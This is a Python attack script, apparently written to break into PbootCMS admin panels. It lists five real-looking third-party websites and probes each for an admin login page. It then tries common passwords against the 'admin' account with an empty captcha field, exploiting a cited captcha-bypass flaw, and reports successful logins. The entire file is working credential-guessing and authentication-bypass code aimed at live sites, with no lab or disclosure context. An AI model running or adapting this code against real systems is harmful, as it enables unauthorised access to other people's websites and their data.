#!/usr/bin/env python3
"""PbootCMS real sites - admin login with empty captcha bypass (CVE-2022-25471 related)
PbootCMS <=3.x: admin login accepts empty code field
"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["http://catugbio.com", "http://bowlwithseoul.com", "http://environmentalhelp.net",
         "http://garagedoors-houstonheights.com", "http://0do.net"]
PWS = ["admin", "admin123", "123456", "admin888", "pbootcms", "pboot", "12345678", "a123456", "admin666"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

for site in SITES:
    print("=== %s ===" % site, flush=True)
    op, cj = get_opener()
    # find admin path
    admin_path = "/admin/"
    code, final, body = fetch(op, site + admin_path)
    if code != 200 or "password" not in body.lower() and "用户名" not in body:
        # try /admin.php
        code, final, body = fetch(op, site + "/admin.php")
        if code == 200 and ("password" in body.lower() or "用户名" in body):
            admin_path = "/admin.php"
        else:
            print("  no admin found (%s)" % code, flush=True)
            continue
    print("  admin: %s size=%d" % (admin_path, len(body)), flush=True)
    # PbootCMS login POST: user/password/code (empty code bypass)
    for pw in PWS:
        data = urllib.parse.urlencode({"user": "admin", "password": pw, "code": ""})
        code, final, body = fetch(op, site + admin_path, data=data, referer=site + admin_path)
        ok = "退出" in body or "logout" in body.lower() or "后台首页" in body or "index/index" in final.lower()
        print("  admin/%s: code=%s ok=%s size=%d" % (pw, code, ok, len(body)), flush=True)
        if ok:
            print("  !!! HIT admin/%s" % pw, flush=True)
            break
